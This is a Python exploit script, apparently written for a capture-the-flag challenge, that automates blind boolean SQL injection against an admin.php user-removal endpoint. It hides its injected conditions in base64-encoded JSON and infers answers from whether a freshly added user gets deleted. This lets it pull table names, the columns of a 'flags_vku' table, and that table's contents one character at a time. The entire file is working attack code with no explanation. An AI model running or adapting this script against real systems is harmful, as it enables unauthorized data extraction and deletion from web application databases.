import requests
import json
import base64
import sys

in_url = input("ENTER IP AND PORT FOR WEBSITE EXAMPLE: 123.124.533.345:9898 \n")
url = f"http://{in_url}/"
post_delete = "admin.php"
url_result = "blank.html"
list_wordlist=list("abcdefghijklmnopqrstuvwxyz0123456789,ABCDEFGHIJKLMNOPQRSTUVWXYZ_!@#$%^&*{}();")
encoded_data_get = {
    "data":"eyJyZXF1ZXN0TWV0aG9kIjoiZ2V0QWxsVXNlcnMifQ=="
}
encode_data_add ={
    "data":"eyJ1c2VybmFtZV9hZGRfc3FsIjoiaGFja2luZyIsInBhc3N3b3JkX2FkZF9zcWwiOiJoYWNraW5nIiwicmVxdWVzdE1ldGhvZCI6ImFkZFVzZXIifQ=="
}

json_data_get = json.dumps(encoded_data_get);
json_data_add = json.dumps(encode_data_add);

#GET LENGHT FOR STRING TABLE
length_table=0
while True:
    payload = f"users 123' OR (SELECT LENGTH(GROUP_CONCAT(TABLE_NAME)) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = database()) = {length_table} ; ##"
    dataClear = f"""{{"username_remove_sql":"{payload}","requestMethod":"removeUser"}}"""
    encoded_data = base64.b64encode(dataClear.encode()).decode()
    data = {
        "data": encoded_data
    }
    json_data = json.dumps(data)

    response_add = requests.post(url=url + post_delete, data=json_data_add,  allow_redirects=False, verify=False)
    response_delete = requests.post(url=url + post_delete, data=json_data,  allow_redirects=False, verify=False)
    response_result = requests.get(url=url + post_delete, data=json_data_get, allow_redirects=False, verify=False)
    response_data = json.loads(response_result.text)
    print(payload)
    if response_data == "EMPTY":
        break
    length_table+=1
#GET TABLE 
table_string=""
for i in range(1,length_table+1):
    for char in list_wordlist:
        payload = f"users 123' OR (SELECT SUBSTRING((SELECT (GROUP_CONCAT(TABLE_NAME)) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = database()), {i}, 1) = '{char}') ; ##"
        dataClear = f"""{{"username_remove_sql":"{payload}","requestMethod":"removeUser"}}"""
        encoded_data = base64.b64encode(dataClear.encode()).decode()
        data = {
            "data": encoded_data
        }
        json_data = json.dumps(data)

        response_add = requests.post(url=url + post_delete, data=json_data_add,  allow_redirects=False, verify=False)
        response_delete = requests.post(url=url + post_delete, data=json_data,  allow_redirects=False, verify=False)
        response_result = requests.get(url=url + post_delete, data=json_data_get, allow_redirects=False, verify=False)
        response_data = json.loads(response_result.text)
        print(payload)
        if response_data == "EMPTY":
            table_string+=char
            break
table = table_string.split(",")
print(f"table is {table}")
for table_child in table:
    if table_child != 'flags_vku':
        continue
    #GET LENGHT COLUMNS
    lenght_colums=0
    while True:
        payload = f"users 123' OR (SELECT LENGTH(GROUP_CONCAT(COLUMN_NAME)) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '{table_child}') = {lenght_colums} ; ##"
        dataClear = f"""{{"username_remove_sql":"{payload}","requestMethod":"removeUser"}}"""
        encoded_data = base64.b64encode(dataClear.encode()).decode()
        data = {
            "data": encoded_data
        }
        json_data = json.dumps(data)

        response_add = requests.post(url=url + post_delete, data=json_data_add,  allow_redirects=False, verify=False)
        response_delete = requests.post(url=url + post_delete, data=json_data,  allow_redirects=False, verify=False)
        response_result = requests.get(url=url + post_delete, data=json_data_get, allow_redirects=False, verify=False)
        response_data = json.loads(response_result.text)
        print(payload)
        if response_data == "EMPTY":
            break
        lenght_colums+=1
    print(lenght_colums)
    #GET COLUMNS 
    columns_string=""
    for i in range(1,lenght_colums+1):
        for char in list_wordlist:
            payload = f"users 123' OR (SELECT SUBSTRING((SELECT (GROUP_CONCAT(COLUMN_NAME)) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '{table_child}'), {i}, 1) = '{char}') ; ##"
            dataClear = f"""{{"username_remove_sql":"{payload}","requestMethod":"removeUser"}}"""
            encoded_data = base64.b64encode(dataClear.encode()).decode()
            data = {
                "data": encoded_data
            }
            json_data = json.dumps(data)

            response_add = requests.post(url=url + post_delete, data=json_data_add,  allow_redirects=False, verify=False)
            response_delete = requests.post(url=url + post_delete, data=json_data,  allow_redirects=False, verify=False)
            response_result = requests.get(url=url + post_delete, data=json_data_get, allow_redirects=False, verify=False)
            response_data = json.loads(response_result.text)
            print(payload)
            if response_data == "EMPTY":
                columns_string+=char
                break
    columns = columns_string.split(",")
    print(f"columns is {columns}")
    #GET LENGHT CONTENT
    lenght_content_table=0
    while True:
        payload = f"users 123' OR (SELECT LENGTH(GROUP_CONCAT({columns[0]})) FROM {table_child}) = {lenght_content_table} ; ##"
        dataClear = f"""{{"username_remove_sql":"{payload}","requestMethod":"removeUser"}}"""
        encoded_data = base64.b64encode(dataClear.encode()).decode()
        data = {
            "data": encoded_data
        }
        json_data = json.dumps(data)

        response_add = requests.post(url=url + post_delete, data=json_data_add,  allow_redirects=False, verify=False)
        response_delete = requests.post(url=url + post_delete, data=json_data,  allow_redirects=False, verify=False)
        response_result = requests.get(url=url + post_delete, data=json_data_get, allow_redirects=False, verify=False)
        response_data = json.loads(response_result.text)
        print(payload)
        if response_data == "EMPTY":
            break
        lenght_content_table+=1
    print(lenght_content_table)
    #GET CONTENT TABLE
    table_string_content=""
    for i in range(1,lenght_content_table+1):
        for char in list_wordlist:
            payload = f"users 123' OR (SELECT SUBSTRING((SELECT (GROUP_CONCAT({columns[0]})) FROM {table_child}), {i}, 1) = '{char}') ; ##"
            dataClear = f"""{{"username_remove_sql":"{payload}","requestMethod":"removeUser"}}"""
            encoded_data = base64.b64encode(dataClear.encode()).decode()
            data = {
                "data": encoded_data
            }
            json_data = json.dumps(data)

            response_add = requests.post(url=url + post_delete, data=json_data_add,  allow_redirects=False, verify=False)
            response_delete = requests.post(url=url + post_delete, data=json_data,  allow_redirects=False, verify=False)
            response_result = requests.get(url=url + post_delete, data=json_data_get, allow_redirects=False, verify=False)
            response_data = json.loads(response_result.text)
            print(payload)
            if response_data == "EMPTY":
                table_string_content+=char
                break
    content_table = table_string_content.split(",")
    print(content_table)
    break